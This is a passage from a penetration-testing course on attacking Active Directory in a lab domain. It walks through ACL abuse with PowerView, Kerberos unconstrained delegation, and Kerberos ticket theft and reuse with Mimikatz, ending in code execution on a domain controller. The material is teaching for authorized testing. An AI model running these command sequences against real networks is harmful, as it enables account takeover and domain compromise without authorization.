importing it, we can use Get-ObjectAcl, specifying our own user: 
PS C:\tools> . .\powerview.ps1 
 
PS C:\tools> Get-ObjectAcl -Identity offsec 
 
ObjectDN               : CN=Offsec,OU=prodUsers,DC=prod,DC=corp1,DC=com 
ObjectSID              : S-1-5-21-3776646582-2086779273-4091361643-1111 
ActiveDirectoryRights  : ReadProperty 
ObjectAceFlags         : ObjectAceTypePresent 
ObjectAceType          : 4c164200-20c0-11d0-a768-00aa006e0529 
InheritedObjectAceType : 00000000-0000-0000-0000-000000000000 
BinaryLength           : 56 
AceQualifier           : AccessAllowed 
IsCallback             : False 
OpaqueLength           : 0 
AccessMask             : 16 
SecurityIdentifier     : S-1-5-21-3776646582-2086779273-4091361643-553 
AceType                : AccessAllowedObject 
AceFlags               : None 
IsInherited            : False 
InheritanceFlags       : None 
PropagationFlags       : None 
AuditFlags             : None 
... 
Listing 790 - Output from Get-ObjectAcl 
The Get-ObjectAcl output prints the often-lengthy list of ACEs applied to the object. In the output 
above, only the first ACE is shown and the access rights, SID, and ACE type are highlighted. 
The output tells us that the AD object identified by the S-1-5-21-3776646582-2086779273-
4091361643-553 SID has ReadProperty access rights to the Offsec user. The SID is difficult to 
read but PowerView includes the ConvertFrom-SID method, which can convert the SID to a 
username or group as displayed in Listing 791. 
PS C:\tools> ConvertFrom-SID S-1-5-21-3776646582-2086779273-4091361643-553 
PROD\RAS and IAS Servers 
Listing 791 - Converting from SID to group name 
 
959 (Wikipedia, 2020), https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol 
960 (BlackHat, 2017), https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-
Directory-DACL-Backdoors.pdf 
961 (PowerView, 2018), https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
610 
The converted SID shows us that a default AD domain group called RAS and IAS Servers has 
ReadProperty access rights to our current user. This is a fairly common access right, however, 
and does not indicate a vulnerability. 
This enumeration produced a lot of output and required a manual SID conversion. To automate 
this, we can wrap Get-ObjectAcl in a ForEach loop to resolve the SID through ConvertFrom-SID. 
PS C:\tools> Get-ObjectAcl -Identity offsec -ResolveGUIDs | Foreach-Object {$_ | Add-
Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID 
$_.SecurityIdentifier.value) -Force; $_} 
Listing 792 - Converting SID for each identity 
This appends the resolved user or group name to each ACE and shows the ACE for members of 
the Domain Admins group as shown in Listing 793: 
... 
AceType               : AccessAllowed 
ObjectDN              : CN=Offsec,OU=prodUsers,DC=prod,DC=corp1,DC=com 
ActiveDirectoryRights : GenericAll 
OpaqueLength          : 0 
ObjectSID             : S-1-5-21-3776646582-2086779273-4091361643-1111 
InheritanceFlags      : None 
BinaryLength          : 36 
IsInherited           : False 
IsCallback            : False 
PropagationFlags      : None 
SecurityIdentifier    : S-1-5-21-3776646582-2086779273-4091361643-512 
AccessMask            : 983551 
AuditFlags            : None 
AceFlags              : None 
AceQualifier          : AccessAllowed 
Identity              : PROD\Domain Admins 
... 
Listing 793 - Access rights to Offsec for Domain Admins 
Not surprisingly, members of the Domain Admins group have the GenericAll access right, which 
equates to the file access equivalent of Full Control. 
Armed with a basic understanding of DACLs and ACEs and a working enumeration technique, 
we’ll explore a series of misconfigurations in the next two sections that allow us to compromise 
additional users or groups. 
16.1.1.1 Exercises 
1. 
Repeat the enumeration techniques with PowerView shown in this section. 
2. 
Filter the output further to only display the ACE for the current user. 
16.1.2 
Abusing GenericAll 
In our first case study, we’ll focus on the GenericAll access right, which gives full control of the 
targeted object. 
To begin, we first enumerate all domain users that our current account has GenericAll rights to. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
611 
One approach is to gather all domain users with PowerView’s Get-DomainUser method and pipe 
the output into Get-ObjectAcl. 
This will enumerate all ACEs for all domain users. Next, we can resolve the SID, add it to the 
output, and finally filter on usernames that match our current user as set in the $env:UserDomain 
and $env:Username environment variables: 
PS C:\tools> Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-
Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID 
$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq 
$("$env:UserDomain\$env:Username")) {$_}} 
 
AceType               : AccessAllowed 
ObjectDN              : CN=TestService1,OU=prodUsers,DC=prod,DC=corp1,DC=com 
ActiveDirectoryRights : GenericAll 
OpaqueLength          : 0 
ObjectSID             : S-1-5-21-3776646582-2086779273-4091361643-1604 
InheritanceFlags      : None 
BinaryLength          : 36 
IsInherited           : False 
IsCallback            : False 
PropagationFlags      : None 
SecurityIdentifier    : S-1-5-21-3776646582-2086779273-4091361643-1111 
AccessMask            : 983551 
AuditFlags            : None 
AceFlags              : None 
AceQualifier          : AccessAllowed 
Identity              : PROD\offsec 
... 
Listing 794 - Locating all ACEs for current user 
The output reveals that our current user (Offsec) has the GenericAll access right on the 
TestService1 account. This is likely a misconfiguration since this is a non-default access right and 
is excessive. 
Although the misconfigurations in this module are used for demonstration 
purposes, some applications (like Exchange or SharePoint) require seemingly 
excessive access rights to their associated service accounts. 
The GenericAll access right gives us full control over the TestService1 user, which among other 
things, allows us to change the password of the account without knowledge of the old password: 
PS C:\tools> net user testservice1 h4x /domain 
The request will be processed at a domain controller for domain prod.corp1.com. 
 
The command completed successfully. 
Listing 795 - Changing password of TestService1 
Once we reset the password, we can either log in to a computer (like appsrv01) with the account 
or create a process in the context of that user to perform a pass-the-ticket attack. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
612 
Compromising an account with an allowed GenericAll access right is very simple. We can also 
abuse the ForceChangePassword and AllExtendedRights access rights to change the password of 
a user account in a similar way without supplying the old password. 
So far, we have only dealt with user accounts, but since everything in Active Directory is an object, 
these concepts also apply to groups. 
For example, we can enumerate all domain groups that our current user has explicit access rights 
to by piping the output of Get-DomainGroup into Get-ObjectAcl and filtering it, in a process 
similar to the previous user account enumeration: 
PS C:\tools> Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-
Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID 
$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq 
$("$env:UserDomain\$env:Username")) {$_}} 
 
AceType               : AccessAllowed 
ObjectDN              : CN=TestGroup,OU=prodGroups,DC=prod,DC=corp1,DC=com 
ActiveDirectoryRights : GenericAll 
OpaqueLength          : 0 
ObjectSID             : S-1-5-21-3776646582-2086779273-4091361643-1607 
InheritanceFlags      : None 
BinaryLength          : 36 
IsInherited           : False 
IsCallback            : False 
PropagationFlags      : None 
SecurityIdentifier    : S-1-5-21-3776646582-2086779273-4091361643-1111 
AccessMask            : 983551 
AuditFlags            : None 
AceFlags              : None 
AceQualifier          : AccessAllowed 
Identity              : PROD\offsec 
Listing 796 - Enumerating group access rights 
Listing 796 shows that we have GenericAll access rights on the TestGroup group. Since 
GenericAll gives us full access to the group, we can compromise the group by simply adding 
ourselves to it: 
PS C:\tools> net group testgroup offsec /add /domain 
The request will be processed at a domain controller for domain prod.corp1.com. 
 
The command completed successfully. 
Listing 797 - Adding the user offsec to TestGroups 
As with user accounts, we can also use the AllExtendedRights and GenericWrite access rights in a 
similar way. 
GenericAll is an extremely powerful access right that can lead to very straightforward 
compromise. In the next section, we’ll cover another access right that we can leverage for 
compromise. 
16.1.2.1 Exercises 
1. 
Enumerate domain users and search for associated GenericAll permissions. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
613 
2. 
Leverage the access right to take over the TestService1 account and obtain code execution 
in the context of that user through a reverse shell. 
3. 
Enumerate domain groups and leverage GenericAll permissions to obtain group 
membership. 
16.1.3 
Abusing WriteDACL 
As previously stated, all Active Directory objects have a DACL and one object access right in 
particular (WriteDACL) grants permission to modify the DACL itself. In this section, we’ll leverage 
this to compromise an account. 
Before we start the attack, we’ll enumerate misconfigured user accounts with Get-DomainUser 
and Get-ObjectAcl: 
PS C:\tools> Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-
Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID 
$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq 
$("$env:UserDomain\$env:Username")) {$_}} 
 
... 
 
AceType               : AccessAllowed 
ObjectDN              : CN=TestService2,OU=prodUsers,DC=prod,DC=corp1,DC=com 
ActiveDirectoryRights : ReadProperty, GenericExecute, WriteDacl 
OpaqueLength          : 0 
ObjectSID             : S-1-5-21-3776646582-2086779273-4091361643-1608 
InheritanceFlags      : None 
BinaryLength          : 36 
IsInherited           : False 
IsCallback            : False 
PropagationFlags      : None 
SecurityIdentifier    : S-1-5-21-3776646582-2086779273-4091361643-1111 
AccessMask            : 393236 
AuditFlags            : None 
AceFlags              : None 
AceQualifier          : AccessAllowed 
Identity              : PROD\offsec 
... 
Listing 798 - Enumerating WriteDACL access rights 
The output in Listing 798 reveals that our current user has WriteDACL access rights to the 
TestService2 user, which allows us to add new access rights like GenericAll. 
We can use the Add-DomainObjectAcl PowerView method to apply additional access rights 
such as GenericAll, GenericWrite, or even DCSync962 if the targeted object is the domain object. 
For example, let’s add the GenericAll access right to the TestService2 object: 
PS C:\tools> Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity 
offsec -Rights All 
Listing 799 - Adding access rights with Add-DomainObjectAcl 
 
962 (adsecurity, 2015), https://adsecurity.org/?p=1729 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
614 
Although the method is called Add-DomainObjectAcl, it will actually modify the 
current ACE if an entry already exists. 
After attempting to modify the DACL, we’ll dump it again to verify that GenericAll was applied 
correctly: 
PS C:\tools> Get-ObjectAcl -Identity testservice2 -ResolveGUIDs | Foreach-Object {$_ | 
Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID 
$_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq 
$("$env:UserDomain\$env:Username")) {$_}} 
 
 
AceType               : AccessAllowed 
ObjectDN              : CN=TestService2,OU=prodUsers,DC=prod,DC=corp1,DC=com 
ActiveDirectoryRights : GenericAll 
OpaqueLength          : 0 
ObjectSID             : S-1-5-21-3776646582-2086779273-4091361643-1608 
InheritanceFlags      : None 
BinaryLength          : 36 
IsInherited           : False 
IsCallback            : False 
PropagationFlags      : None 
SecurityIdentifier    : S-1-5-21-3776646582-2086779273-4091361643-1111 
AccessMask            : 983551 
AuditFlags            : None 
AceFlags              : None 
AceQualifier          : AccessAllowed 
Identity              : PROD\offsec 
Listing 800 - Verifying the modified access rights 
The highlighted section of Listing 800 reveals that we now have GenericAll access rights to 
TestService2. Let’s proceed to change its password: 
PS C:\tools> net user testservice2 h4x /domain 
The request will be processed at a domain controller for domain prod.corp1.com. 
 
The command completed successfully. 
Listing 801 - Changing the password of TestService2 
The password change was successful. As demonstrated, the WriteDACL access right is just as 
powerful as GenericAll. 
Although enumerating access rights for our current user is beneficial, we can also map out all 
access rights to locate other user accounts or groups that can lead to compromise. 
This seems like a daunting task to perform against a large network but we can do this relatively 
easily with the BloodHound963,964 PowerShell script or its C# counterpart SharpHound.965 These 
 
963 (BloodHound, 2019), https://github.com/BloodHoundAD/BloodHound 
964 (@Waldo, 2017), https://wald0.com/?p=112 
965 (SharpHound, 2020), https://github.com/BloodHoundAD/SharpHound 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
615 
tools enumerate all domain attack paths including users, groups, computers, GPOs,966 and 
misconfigured access rights. 
We can also leverage the BloodHound JavaScript web application967 locally to visually display 
prospective attack paths, which is essential during a penetration test against large Active 
Directory infrastructures. 
Running these tools against our small lab domain would yield unimpressive results, but these 
tools are invaluable during a large penetration tests. 
16.1.3.1 Exercises 
1. 
Enumerate the network to discover accounts with compromisable WriteDACL access rights. 
2. 
Leverage the WriteDACL access right to compromise affected accounts. 
16.1.3.2 Extra Mile 
GenericWrite applied to a user account can lead to compromise. Perform enumeration in the labs 
to discover any GenericWrite misconfigurations and work out how to compromise the relevant 
account. 
16.2 Kerberos Delegation 
Application and data access configurations often require fine-grained permissions, which can 
create design issues and security misconfigurations. One classic example of this lies in the 
Kerberos protocol and its authentication mechanism. 
For example, consider an internal web server application that is only available to company 
employees. This web application uses Windows Authentication and retrieves data from a backend 
database. In this scenario, the web application should only be able to access data from the 
database server if the user accessing the web application has appropriate access according to 
Active Directory group membership. 
Kerberos does not directly provide a way to accomplish this. When the web application uses 
Kerberos authentication, it is only presented with the user’s service ticket. This service ticket 
contains access permissions for the web application, but the web server service account can not 
use it to access the backend database. This is known as the Kerberos double-hop issue. 
Microsoft’s Kerberos delegation solves this design issue and provides a way for the web server to 
authenticate to the backend database on behalf of the user. Microsoft released several 
implementations of this including unconstrained delegation (in 2000), constrained delegation (in 
2003), and resource based constrained delegation (in 2012). These implementations solved 
various security issues and each is available at the time of this writing, providing backwards 
compatibility. However, resource-based constrained delegation requires a domain functional 
level968 of 2012. 
 
966 (Microsoft, 2018), https://docs.microsoft.com/en-us/previous-versions/windows/desktop/policy/group-policy-
objects#:~:text=A%20Group%20Policy%20Object%20(GPO,and%20in%20the%20Active%20Directory 
967 (BloodHound, 2020), https://bloodhound.readthedocs.io/en/latest/data-analysis/bloodhound-gui.html 
968 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
616 
In the next sections, we will discuss each of these delegation types and demonstrate how they 
can be exploited. 
16.2.1 
Unconstrained Delegation 
In this section, we’ll discuss unconstrained delegation, its specific security ramifications, and 
demonstrate how to exploit it. First, we must define unconstrained delegation and explain how it 
works. We’ll begin with an overview of Kerberos authentication. 
When a user successfully logs in to a computer, a Ticket Granting Ticket (TGT) is returned. Once 
the user requests access to a service that uses Kerberos authentication, a Ticket Granting Service 
ticket (TGS) is generated by the Key Distribution Center (KDC) based on the TGT and returned to 
the user. 
This TGS is then sent to the service, which validates the access. Note that this TGS only allows 
that specific user to access that specific service. 
Since the service cannot reuse the TGS to authenticate to a backend service, any Kerberos 
authentication stops here. Unconstrained delegation solves this with a forwardable TGT.969 
When the user requests access for a service ticket against a service that uses unconstrained 
delegation, the request also includes a forwardable TGT as illustrated in Figure 243. 
 
Figure 243: Kerberos communication for unconstrained delegation 
 
969 (RFC4120, 2020), https://tools.ietf.org/html/rfc4120 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
617 
 
The KDC returns a TGT with the forward flag set along with a session key for that TGT and a 
regular TGS. The user’s client embeds the TGT and the session key into the TGS and sends it to 
the service, which can now impersonate the user to the backend service. 
In the previous example, this means we request a TGS for a web server service along with a 
forwardable TGT. We then embed the TGT into the TGS and send it to the web server service. The 
web server is now able to perform authentication to the backend database as our user and 
extract the required information. 
This solves the double-hop issue and provides a working solution, but as we will soon discuss, 
this introduces a number of problems as well. 
Since the frontend service receives a forwardable TGT, it can perform authentication on behalf of 
the user to any service (because of unconstrained delegation), not just the intended backend 
service. In our scenario, this means that if we succeed in compromising the web server service 
and a user authenticates to it, we can steal the user’s TGT and authenticate to any service. This is 
especially interesting if the authenticating user is a high-privileged domain account. 
Now that we have covered the theory, let’s perform this attack in the labs. 
As with most attack techniques, we’ll begin with enumeration. Fortunately, the Domain Controller 
(DC) stores the information about computers configured with unconstrained delegation and 
makes this information available for all authenticated users. 
The information is stored in the userAccountControl970 property as TRUSTED_FOR_DELEGATION, 
which is represented with a numerical value of 524288. 
From the Windows 10 client as the Offsec domain user, we’ll use Powerview to enumerate 
unconstrained delegation through the Get-DomainComputer method by supplying the -
Unconstrained flag, which parses the userAccountControl property for each computer: 
PS C:\tools> Get-DomainComputer -Unconstrained 
... 
 
logoncount                               : 94 
badpasswordtime                          : 12/31/1600 4:00:00 PM 
distinguishedname                        : 
CN=APPSRV01,OU=prodComputers,DC=prod,DC=corp1,DC=com 
objectclass                              : {top, person, organizationalPerson, 
user...} 
badpwdcount                              : 0 
lastlogontimestamp                       : 4/3/2020 7:13:37 AM 
objectsid                                : S-1-5-21-3776646582-2086779273-4091361643-
1110 
samaccountname                           : APPSRV01$ 
localpolicyflags                         : 0 
codepage                                 : 0 
samaccounttype                           : MACHINE_ACCOUNT 
countrycode                              : 0 
 
970 (Microsoft, 2020), https://support.microsoft.com/en-us/help/305144/how-to-use-useraccountcontrol-to-manipulate-user-account-
properties 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
618 
cn                                       : APPSRV01 
accountexpires                           : NEVER 
whenchanged                              : 4/6/2020 5:59:45 PM 
instancetype                             : 4 
usncreated                               : 28698 
objectguid                               : 00056504-3939-4ce1-8795-5e2766613395 
operatingsystem                          : Windows Server 2016 Standard 
operatingsystemversion                   : 10.0 (14393) 
lastlogoff                               : 12/31/1600 4:00:00 PM 
msds-allowedtoactonbehalfofotheridentity : {1, 0, 4, 128...} 
objectcategory                           : 
CN=Computer,CN=Schema,CN=Configuration,DC=corp1,DC=com 
dscorepropagationdata                    : {4/6/2020 1:55:02 PM, 4/6/2020 1:54:34 PM, 
4/6/2020 
                                           1:34:32 PM, 4/6/2020 1:07:59 PM...} 
serviceprincipalname                     : {TERMSRV/APPSRV01, 
TERMSRV/APPSRV01.prod.corp1.com, 
                                           WSMAN/APPSRV01, 
WSMAN/APPSRV01.prod.corp1.com...} 
lastlogon                                : 4/13/2020 4:21:01 AM 
iscriticalsystemobject                   : False 
usnchanged                               : 49358 
useraccountcontrol                       : WORKSTATION_TRUST_ACCOUNT, 
TRUSTED_FOR_DELEGATION 
whencreated                              : 4/3/2020 2:13:37 PM 
primarygroupid                           : 515 
pwdlastset                               : 4/3/2020 7:13:37 AM 
msds-supportedencryptiontypes            : 28 
name                                     : APPSRV01 
dnshostname                              : APPSRV01.prod.corp1.com 
Listing 802 - Finding computers configured with unconstrained delegation 
The appsrv01 machine is configured with unconstrained delegation and will be our target in this 
section. 
Service accounts can also be configured with unconstrained delegation if the 
application executes in the context of the service account rather than the 
machine account. 
To abuse unconstrained delegation, we must first compromise the computer or service account 
in question. We’ll begin by resolving the IP address of appsrv01 with nslookup: 
PS C:\tools> nslookup appsrv01 
Server:  UnKnown 
Address:  192.168.120.70 
 
Name:    appsrv01.prod.corp1.com 
Address:  192.168.120.75 
Listing 803 - Finding IP address of appsrv01 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
619 
At this stage, we must either perform lateral movement onto appsrv01 or compromise a 
vulnerable application on that machine. For purposes of demonstration, we’ll simply log in to 
appsrv01 as the Offsec user instead, which is local administrator on the target system. 
When unconstrained delegation is operating normally, the service account hosting the application 
can freely make use of the forwarded tickets it receives from users. This means if we 
compromise the service account as a part of an attack, we can exploit unconstrained delegation 
without needing local administrative privileges, because we already have access to all affected 
tickets. 
In our example, we logged in to appsrv01 as the Offsec user as part of our attack simulation. 
Because of this, we must use administrative privileges to extract the TGTs supplied by users to 
IIS. 
First, we’ll launch Mimikatz from an administrative command prompt and list all tickets present 
with sekurlsa::tickets as shown in Listing 804. 
mimikatz # privilege::debug 
Privilege '20' OK 
 
mimikatz # sekurlsa::tickets 
 
Authentication Id : 0 ; 41754630 (00000000:027d2006) 
Session           : RemoteInteractive from 4 
User Name         : offsec 
Domain            : PROD 
Logon Server      : CDC01 
Logon Time        : 4/13/2020 4:46:52 AM 
SID               : S-1-5-21-3776646582-2086779273-4091361643-1111 
 
         * Username : offsec 
         * Domain   : PROD.CORP1.COM 
         * Password : (null) 
 
        Group 0 - Ticket Granting Service 
         [00000000] 
           Start/End/MaxRenew: 4/13/2020 4:46:53 AM ; 4/13/2020 2:46:52 PM ; 4/20/2020 
4:46:52 AM 
           Service Name (02) : LDAP ; CDC01.prod.corp1.com ; prod.corp1.com ; @ 
PROD.CORP1.COM 
           Target Name  (02) : LDAP ; CDC01.prod.corp1.com ; prod.corp1.com ; @ 
PROD.CORP1.COM 
           Client Name  (01) : offsec ; @ PROD.CORP1.COM ( PROD.CORP1.COM ) 
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; 
renewable ; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac 
             3baefc16bac50328ae442fa78c3599b820479a603544e21e0dcc6bea73f30db5 
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...] 
 
        Group 1 - Client Ticket ? 
 
        Group 2 - Ticket Granting Ticket 
         [00000000] 
           Start/End/MaxRenew: 4/13/2020 4:46:52 AM ; 4/13/2020 2:46:52 PM ; 4/20/2020 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
620 
4:46:52 AM 
           Service Name (02) : krbtgt ; PROD.CORP1.COM ; @ PROD.CORP1.COM 
           Target Name  (02) : krbtgt ; prod ; @ PROD.CORP1.COM 
           Client Name  (01) : offsec ; @ PROD.CORP1.COM ( prod ) 
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; 
forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac 
             d9b04d7cb8960337ecab1774c96bdb978fba55b72e42957fd8769663fd8104cf 
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...] 
... 
Listing 804 - No tickets from foreign users 
We find TGTs and TGSs related to the Offsec user along with the computer account, but no other 
domain users. 
Typically, a machine would only be configured with unconstrained delegation because it hosts an 
application that requires it. An Nmap scan against this machine reveals a single running 
application: an IIS-hosted web site running on port 80. 
Since this is a legitimate site, we can either wait for a user to connect or leverage an internal 
phishing attack to solicit visits. In our example, we’ll simulate this by logging in to the Windows 10 
client as the admin domain user and browsing to http://appsrv01. Since the web application is 
configured with Windows authentication, the Kerberos protocol is used. 
After the browser has loaded the web page (which in our example is just a default IIS splash 
screen), we’ll switch back to appsrv01 and execute the sekurlsa::tickets command again: 
... 
Authentication Id : 0 ; 42304798 (00000000:0285851e) 
Session           : Network from 0 
User Name         : admin 
Domain            : PROD 
Logon Server      : (null) 
Logon Time        : 4/13/2020 5:14:40 AM 
SID               : S-1-5-21-3776646582-2086779273-4091361643-1105 
 
         * Username : admin 
         * Domain   : PROD.CORP1.COM 
         * Password : (null) 
 
        Group 0 - Ticket Granting Service 
 
        Group 1 - Client Ticket ? 
 
        Group 2 - Ticket Granting Ticket 
         [00000000] 
           Start/End/MaxRenew: 4/13/2020 5:14:40 AM ; 4/13/2020 3:11:20 PM ; 4/20/2020 
5:11:20 AM 
           Service Name (02) : krbtgt ; PROD.CORP1.COM ; @ PROD.CORP1.COM 
           Target Name  (--) : @ PROD.CORP1.COM 
           Client Name  (01) : admin ; @ PROD.CORP1.COM 
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded 
; forwardable ; 
           Session Key       : 0x00000012 - aes256_hmac 
             517cd6b29bac62711b184487d095507c5231b9d921fa7ae8c52a475edf721474 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
621 
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...] 
... 
Listing 805 - TGT for admin user is present 
This time, we find a TGT for the admin user and it is flagged as forwardable. We can use the 
/export flag with sekurlsa::tickets to dump it to disk and then inject the TGT contents from 
the output file into our process with the kerberos::ptt command: 
mimikatz # sekurlsa::tickets /export 
 
... 
 
Group 2 - Ticket Granting Ticket 
 [00000000] 
   Start/End/MaxRenew: 4/13/2020 5:14:40 AM ; 4/13/2020 3:11:20 PM ; 4/20/2020 5:11:20 
AM 
   Service Name (02) : krbtgt ; PROD.CORP1.COM ; @ PROD.CORP1.COM 
   Target Name  (--) : @ PROD.CORP1.COM 
   Client Name  (01) : admin ; @ PROD.CORP1.COM 
   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; 
forwardable ; 
   Session Key       : 0x00000012 - aes256_hmac 
     517cd6b29bac62711b184487d095507c5231b9d921fa7ae8c52a475edf721474 
   Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...] 
   * Saved to file [0;9eaea]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi ! 
 
... 
 
mimikatz # kerberos::ptt [0;9eaea]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi 
 
* File: '[0;9eaea]-2-0-60a10000-admin@krbtgt-PROD.CORP1.COM.kirbi': OK 
Listing 806 - Dumping and injecting TGT 
With the TGT for the admin user injected into memory, we can exit Mimikatz and test our access 
on the domain controller with PsExec: 
mimikatz # exit 
Bye! 
 
C:\Tools> C:\Tools\SysinternalsSuite\PsExec.exe \\cdc01 cmd 
 
PsExec v2.2 - Execute processes remotely 
Copyright (C) 2001-2016 Mark Russinovich 
Sysinternals - www.sysinternals.com 
 
 
Microsoft Windows [Version 10.0.17763.737] 
(c) 2018 Microsoft Corporation. All rights reserved. 
 
C:\Windows\system32> whoami 
prod\admin 
Listing 807 - Obtaining code execution on the domain controller 
We have achieved code execution on the domain controller since the admin user is a member of 
the Domain Admins group. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
622 
This illustrates that if a user connects to a service that is configured with unconstrained Kerberos 
delegation, that user can be compromised. 
By default, all users allow their TGT to be delegated, but privileged users can be 
added to the Protected Users group,971 which blocks delegation. Obviously, this 
will also break the functionality of the application that required unconstrained 
delegation for those users. 
In the next section, we’ll improve our abuse of unconstrained delegation so that we do not have to 
rely on social engineering an administrative user. 
16.2.1.1 Exercise 
1. 
Repeat the attack shown in this section to achieve code execution on the domain controller. 
Reboot appsrv01 between sections to ensure no prior tickets are present in memory. 
16.2.2 
I Am a Domain Controller 
In the previous section, we demonstrated that an application or service running on a machine 
with unconstrained delegation can lead to a complete domain compromise. However, the attack 
we performed relied on a privileged user accessing the target application. 
In this section, we’ll demonstrate a technique that will allow us to force a high-privileged 
authentication without any user interaction. This will allow us to compromise the entire domain if 
we succeed in an initial compromise of a single instance of unconstrained delegation. 
We previously exploited the printer bug to escalate our privileges on a target. We achieved this by 
coercing the SYSTEM account to authenticate locally via the MS-RPRN RPC interface. 
However, as stated earlier, this attack was originally designed to work in an Active Directory 
environment. Specifically, the idea behind the SpoolSample tool we used in a previous module is 
to force a Domain Controller to connect back to a system configured with unconstrained 
delegation. This eventually allows the attacker to steal a TGT for the domain controller computer 
account. 
The RPC interface we leveraged locally is indeed also accessible over the network through TCP 
port 445 if the host firewall allows it. TCP port 445 is typically open on Windows servers, including 
domain controllers, and the print spooler service runs automatically at startup in the context of 
the computer account. 
In order to exploit the printer bug in this scenario, we must determine if the print spooler service is 
running and available on the domain controller from appsrv01. The MS-RPRN documentation 
specifies that the RPC endpoint for the print spooler is \pipe\spoolss and that no authentication is 
required. 
 
971 (Microsoft, 2016), https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-
2012/dn466518(v=ws.11)?redirectedfrom=MSDN 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
623 
To test this out, we’ll log in to appsrv01 as the Offsec user and attempt to access the named pipe 
with the dir command: 
PS C:\Tools> dir \\cdc01\pipe\spoolss 
 
    Directory: \\cdc01\pipe 
 
Mode                LastWriteTime         Length Name 
----                -------------         ------ ---- 
                                                 spoolss 
Listing 808 - Enumerating print spooler access 
The output reveals that the print spooler service is running and accessible. 
Recall that this access is by design and RpcRemoteFindFirstPrinterChangeNotification allows us 
to simulate a print client and subscribe to notifications of changes on the print server. These 
notifications are sent over the network by the print spooler service via RPC over a named pipe. 
When the “target” spooler accesses the named pipe on the “attacking” machine, it will present a 
forwardable TGT along with the TGS if the “attacking” machine is configured with unconstrained 
delegation. 
As 
we 
did 
for 
the 
local 
privilege 
escalation, 
we’ll 
call 
the 
RpcOpenPrinter 
and 
RpcRemoteFindFirstPrinterChangeNotification APIs through SpoolSample to facilitate the attack. 
Once the authentication has taken place, we’ll look for tickets in memory originating from the 
domain controller machine account. 
A compiled version of SpoolSample is located in the C:\Tools folder of appsrv01. 
We are missing one final item before we launch the attack. In the last section, we used Mimikatz 
to find and extract the forwardable TGT, but the sheer number of returned TGTs and TGSs makes 
monitoring difficult. In addition, we had to write the TGT to disk to reuse it. 
